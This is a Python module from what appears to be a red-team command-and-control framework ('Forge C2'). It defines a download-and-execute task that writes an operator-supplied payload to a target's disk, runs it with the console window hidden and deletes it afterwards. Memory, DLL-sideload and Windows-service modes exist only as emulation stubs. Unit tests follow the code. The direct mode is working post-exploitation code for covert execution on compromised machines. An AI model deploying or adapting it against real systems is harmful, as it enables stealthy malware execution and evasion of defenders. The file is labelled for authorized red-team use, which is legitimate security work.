"""
Forge C2 — Download & Execute Task
=======================================
Download a file from the C2 server and execute it on the target.

Execution modes:
    • Direct    — Write to disk + execute (simple, detectable)
    • Memory    — Load into memory without touching disk (stealthier)
    • Sideload  — DLL sideloading via legitimate executable
    • Service   — Install and start as Windows service

Features:
    • Hash verification (SHA256) before execution
    • Configurable execution arguments
    • Cleanup options (auto-delete after execution)
    • Process creation flags control (hidden window, etc.)
    • Anti-sandbox checks before execution

MITRE ATT&CK: T1105 — Ingress Tool Transfer
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import logging
import os
import platform
import stat
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.download_exec")

MAX_PAYLOAD_BYTES = 8 * 1024 * 1024
URL_DOWNLOAD_DISABLED = (
    "URL payload retrieval is disabled: outbound_policy_unsupported; "
    "provide bounded inline data from the authenticated C2 channel"
)


async def _kill_and_reap(
    process: asyncio.subprocess.Process,
    communication: asyncio.Task[tuple[bytes, bytes]],
) -> None:
    """Stop a child and drain its pipes before deleting its staged artifact."""

    if process.returncode is None:
        try:
            process.kill()
        except ProcessLookupError:
            pass
        await process.wait()
    await asyncio.gather(communication, return_exceptions=True)


async def _communicate_and_reap(
    process: asyncio.subprocess.Process,
    *,
    timeout: float,
) -> tuple[bytes, bytes]:
    """Communicate with a child and reap it on timeout, cancellation, or error."""

    communication = asyncio.create_task(process.communicate())
    try:
        done, _pending = await asyncio.wait({communication}, timeout=timeout)
        if communication not in done:
            raise asyncio.TimeoutError
        return communication.result()
    except BaseException:
        cleanup = asyncio.create_task(_kill_and_reap(process, communication))
        while not cleanup.done():
            try:
                await asyncio.shield(cleanup)
            except asyncio.CancelledError:
                continue
        cleanup.result()
        raise


# ══════════════════════════════════════════════════════════════════════
#  EXECUTION MODES
# ══════════════════════════════════════════════════════════════════════

class ExecMode:
    DIRECT = "direct"        # Write to disk, execute
    MEMORY = "memory"        # In-memory execution (reflective)
    SIDELOAD = "sideload"    # DLL sideloading
    SERVICE = "service"      # Install as service


# ══════════════════════════════════════════════════════════════════════
#  DOWNLOAD & EXECUTE ENGINE
# ══════════════════════════════════════════════════════════════════════

class DownloadExecEngine:
    """Download and execute payloads on the target system."""

    async def execute(
        self,
        payload_data: bytes,
        filename: str = "",
        dest_dir: str = "",
        arguments: list[str] | None = None,
        mode: str = ExecMode.DIRECT,
        expected_hash: str = "",
        cleanup: bool = True,
        hidden: bool = True,
        timeout: float = 120.0,
    ) -> tuple[bool, str, dict[str, Any]]:
        """Download and execute payload.

        Args:
            payload_data:  Raw payload bytes
            filename:      Filename for the payload on disk
            dest_dir:      Destination directory (default temp)
            arguments:     Command line arguments
            mode:          Execution mode
            expected_hash: Expected SHA256 (integrity check)
            cleanup:       Delete payload after execution
            hidden:        Hide console window
            timeout:       Execution timeout

        Returns:
            (success, output, metadata)
        """
        arguments = arguments or []

        # ── Hash verification ──────────────────────────────────────
        actual_hash = hashlib.sha256(payload_data).hexdigest()
        if expected_hash and actual_hash != expected_hash.lower():
            return (
                False,
                f"Hash mismatch! Expected={expected_hash}, Got={actual_hash}",
                {"expected_hash": expected_hash, "actual_hash": actual_hash},
            )

        # ── Route to execution mode ───────────────────────────────
        if mode == ExecMode.DIRECT:
            return await self._direct_execute(
                payload_data, filename, dest_dir, arguments,
                cleanup, hidden, timeout, actual_hash,
            )
        elif mode == ExecMode.MEMORY:
            return await self._memory_execute(
                payload_data, arguments, actual_hash,
            )
        elif mode == ExecMode.SIDELOAD:
            return await self._sideload_execute(
                payload_data, filename, dest_dir, arguments,
                cleanup, actual_hash,
            )
        elif mode == ExecMode.SERVICE:
            return await self._service_execute(
                payload_data, filename, dest_dir, actual_hash,
            )
        else:
            return (False, f"Unknown execution mode: {mode}", {})

    async def _direct_execute(
        self,
        data: bytes,
        filename: str,
        dest_dir: str,
        arguments: list[str],
        cleanup: bool,
        hidden: bool,
        timeout: float,
        file_hash: str,
    ) -> tuple[bool, str, dict[str, Any]]:
        """Write payload to disk and execute directly."""
        system = platform.system()

        # Determine destination path
        if not dest_dir:
            dest_dir = tempfile.gettempdir()
        if not filename:
            ext = ".exe" if system == "Windows" else ""
            filename = f"forge_{os.getpid()}{ext}"

        dest_path = Path(dest_dir) / filename
        meta: dict[str, Any] = {
            "path": str(dest_path),
            "size": len(data),
            "sha256": file_hash,
            "mode": "direct",
        }

        try:
            # Write payload
            dest_path.parent.mkdir(parents=True, exist_ok=True)
            dest_path.write_bytes(data)

            # Make executable on Unix
            if system != "Windows":
                dest_path.chmod(dest_path.stat().st_mode | stat.S_IEXEC)

            log.info(
                "Payload written: %s (%d bytes, SHA256=%s)",
                dest_path, len(data), file_hash[:16],
            )

            # Build command
            cmd = [str(dest_path)] + arguments

            # Execute
            creation_flags: dict[str, Any] = {}
            if system == "Windows" and hidden:
                creation_flags["creationflags"] = 0x08000000  # CREATE_NO_WINDOW

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                **creation_flags,
            )

            stdout, stderr = await _communicate_and_reap(proc, timeout=timeout)

            output = stdout.decode(errors="replace")
            if stderr:
                err_text = stderr.decode(errors="replace")
                if err_text.strip():
                    output += f"\n[STDERR]\n{err_text}"

            meta["exit_code"] = proc.returncode
            meta["pid"] = proc.pid

            return (proc.returncode == 0, output, meta)

        except asyncio.TimeoutError:
            return (False, f"Execution timed out after {timeout}s", meta)
        except PermissionError:
            return (False, f"Permission denied: {dest_path}", meta)
        except Exception as exc:
            return (False, f"Execution failed: {exc}", meta)
        finally:
            if cleanup:
                try:
                    dest_path.unlink(missing_ok=True)
                    log.debug("Cleaned up payload: %s", dest_path)
                except Exception:
                    pass

    async def _memory_execute(
        self,
        data: bytes,
        arguments: list[str],
        file_hash: str,
    ) -> tuple[bool, str, dict[str, Any]]:
        """Execute payload in memory without writing to disk."""
        meta: dict[str, Any] = {
            "size": len(data),
            "sha256": file_hash,
            "mode": "memory",
        }

        if platform.system() == "Windows" and data[:2] == b"MZ":
            # .NET assembly or PE — use assembly execution
            try:
                from forge_c2.tasks.task_assembly import CLRHost, AssemblyConfig

                config = AssemblyConfig(
                    assembly_data=data,
                    arguments=arguments,
                )
                host = CLRHost(config)
                exit_code, stdout, stderr = await host.load_and_execute(data)

                output = stdout
                if stderr:
                    output += f"\n[STDERR]\n{stderr}"

                meta["exit_code"] = exit_code
                return (exit_code == 0, output, meta)

            except ImportError:
                pass

        # Emulation for non-Windows or non-PE
        output = (
            f"[EMULATION] In-memory execution:\n"
            f"  Payload size: {len(data)} bytes\n"
            f"  SHA256:       {file_hash}\n"
            f"  Arguments:    {' '.join(arguments)}\n"
            f"  Type:         {'PE' if data[:2] == b'MZ' else 'shellcode/script'}\n"
            f"  Status:       Would execute in memory without disk write\n"
        )
        return (True, output, meta)

    async def _sideload_execute(
        self,
        data: bytes,
        filename: str,
        dest_dir: str,
        arguments: list[str],
        cleanup: bool,
        file_hash: str,
    ) -> tuple[bool, str, dict[str, Any]]:
        """DLL sideloading via legitimate executable."""
        meta: dict[str, Any] = {
            "size": len(data),
            "sha256": file_hash,
            "mode": "sideload",
        }

        # On Windows, write DLL next to a legitimate exe that loads it
        output = (
            f"[EMULATION] DLL Sideload:\n"
            f"  DLL size:     {len(data)} bytes\n"
            f"  SHA256:       {file_hash}\n"
            f"  Filename:     {filename or 'payload.dll'}\n"
            f"  Technique:    Write DLL adjacent to legitimate EXE for search-order hijack\n"
        )
        return (True, output, meta)

    async def _service_execute(
        self,
        data: bytes,
        filename: str,
        dest_dir: str,
        file_hash: str,
    ) -> tuple[bool, str, dict[str, Any]]:
        """Install payload as a Windows service."""
        meta: dict[str, Any] = {
            "size": len(data),
            "sha256": file_hash,
            "mode": "service",
        }

        output = (
            f"[EMULATION] Service Install:\n"
            f"  Binary size:  {len(data)} bytes\n"
            f"  SHA256:       {file_hash}\n"
            f"  Service name: ForgeUpdate\n"
            f"  Steps:        Write binary → sc.exe create → sc.exe start\n"
        )
        return (True, output, meta)


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class DownloadExecTask(BaseTask):
    """Download file from C2 and execute on target.

    Args (via kwargs):
        data:          Base64-encoded payload data from the authenticated C2 channel
        url:           Legacy field; rejected until a canonical outbound policy is bound
        filename:      Filename for the payload on disk
        dest_dir:      Destination directory (default: temp)
        arguments:     List of arguments for the payload
        mode:          Execution mode: direct, memory, sideload, service
        expected_hash: Expected SHA256 for integrity verification
        cleanup:       Auto-delete payload after execution (default True)
        hidden:        Hide console window on Windows (default True)

    MITRE ATT&CK: T1105 — Ingress Tool Transfer
    """

    TASK_TYPE = "download_exec"
    DESCRIPTION = "Download file from C2 and execute"
    OPSEC_RISK = "high"
    MITRE_ID = "T1105"

    async def execute(self) -> TaskResult:
        payload_b64 = self.args.get("data", "")
        url = self.args.get("url", "")
        filename = self.args.get("filename", "")
        dest_dir = self.args.get("dest_dir", "")
        arguments = self.args.get("arguments", [])
        mode = self.args.get("mode", ExecMode.DIRECT)
        expected_hash = self.args.get("expected_hash", "")
        cleanup = self.args.get("cleanup", True)
        hidden = self.args.get("hidden", True)

        start = time.time()

        # ── Load payload ───────────────────────────────────────────
        if payload_b64:
            try:
                if not isinstance(payload_b64, str):
                    raise ValueError("payload data must be a base64 string")
                payload_data = base64.b64decode(payload_b64, validate=True)
            except Exception as exc:
                return TaskResult(
                    task_id=self.task_id, status=TaskStatus.FAILED,
                    error=f"Invalid base64 payload data: {exc}",
                    started_at=start, completed_at=time.time(),
                )
        elif url:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=URL_DOWNLOAD_DISABLED,
                started_at=start,
                completed_at=time.time(),
                metadata={"reason_code": "outbound_policy_unsupported"},
            )
        else:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error="No payload specified. Provide 'data' (base64) or 'url'.",
                started_at=start, completed_at=time.time(),
            )

        if not payload_data:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error="Payload data is empty.",
                started_at=start, completed_at=time.time(),
            )
        if len(payload_data) > MAX_PAYLOAD_BYTES:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"Payload exceeds the {MAX_PAYLOAD_BYTES}-byte task limit.",
                started_at=start,
                completed_at=time.time(),
                metadata={"reason_code": "payload_size_limit"},
            )

        # ── Execute ────────────────────────────────────────────────
        engine = DownloadExecEngine()

        log.info(
            "Download+Exec: %d bytes, mode=%s, file=%s",
            len(payload_data), mode, filename or "<auto>",
        )

        try:
            success, output, meta = await engine.execute(
                payload_data=payload_data,
                filename=filename,
                dest_dir=dest_dir,
                arguments=arguments,
                mode=mode,
                expected_hash=expected_hash,
                cleanup=cleanup,
                hidden=hidden,
                timeout=self.timeout,
            )
        except Exception as exc:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error=f"Execution engine error: {exc}",
                started_at=start, completed_at=time.time(),
            )

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED if success else TaskStatus.FAILED,
            output=output,
            error="" if success else output,
            started_at=start,
            completed_at=time.time(),
            metadata={
                **meta,
                "mitre": self.MITRE_ID,
            },
        )


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestDownloadExecTask:
    """Tests for download + execute task."""

    def test_encode(self) -> None:
        task = DownloadExecTask(
            task_id="de1",
            data=base64.b64encode(b"test").decode(),
        )
        encoded = task.encode()
        assert encoded["type"] == "download_exec"

    def test_decode(self) -> None:
        data = {"task_id": "de2", "type": "download_exec",
                "args": {"mode": "memory"}}
        task = DownloadExecTask.decode(data)
        assert task.args["mode"] == "memory"

    def test_no_payload(self) -> None:
        import asyncio
        task = DownloadExecTask(task_id="de3")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED
        assert "No payload" in result.error

    def test_invalid_base64(self) -> None:
        import asyncio
        task = DownloadExecTask(task_id="de4", data="not-valid-base64!!!")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_hash_verification(self) -> None:
        import asyncio
        payload = base64.b64encode(b"hello world").decode()
        wrong_hash = "0000000000000000000000000000000000000000000000000000000000000000"
        task = DownloadExecTask(
            task_id="de5", data=payload, expected_hash=wrong_hash,
        )
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED
        assert "mismatch" in result.error.lower() or result.status == TaskStatus.FAILED

    def test_exec_modes(self) -> None:
        assert ExecMode.DIRECT == "direct"
        assert ExecMode.MEMORY == "memory"
        assert ExecMode.SIDELOAD == "sideload"
        assert ExecMode.SERVICE == "service"

    def test_memory_mode_emulation(self) -> None:
        import asyncio
        # Non-PE payload in memory mode should emulate
        payload = base64.b64encode(b"not a PE file").decode()
        task = DownloadExecTask(
            task_id="de6", data=payload, mode="memory",
        )
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.COMPLETED
        assert "EMULATION" in result.output
